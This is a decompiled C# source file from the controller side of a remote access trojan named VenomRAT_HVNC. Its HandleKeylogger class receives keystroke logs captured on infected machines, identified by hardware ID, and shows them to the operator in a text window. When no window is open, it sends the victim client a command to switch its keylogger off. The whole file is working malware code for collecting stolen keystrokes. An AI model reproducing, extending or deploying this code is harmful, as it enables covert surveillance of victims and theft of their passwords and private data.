using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    // Token: 0x020000A1 RID: 161
    internal class HandleKeylogger
    {
        // Token: 0x060005A1 RID: 1441 RVA: 0x00043B60 File Offset: 0x00043B60
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormKeylogger formKeylogger = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                if (formKeylogger != null)
                {
                    if (formKeylogger.Client == null)
                    {
                        formKeylogger.Client = client;
                        formKeylogger.timer1.Enabled = true;
                    }
                    formKeylogger.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                    formKeylogger.richTextBox1.Text = formKeylogger.Sb.ToString();
                    formKeylogger.richTextBox1.SelectionStart = formKeylogger.richTextBox1.TextLength;
                    formKeylogger.richTextBox1.ScrollToCaret();
                }
                else
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                    msgPack.ForcePathObject("isON").AsString = "false";
                    client.Send(msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
    }
}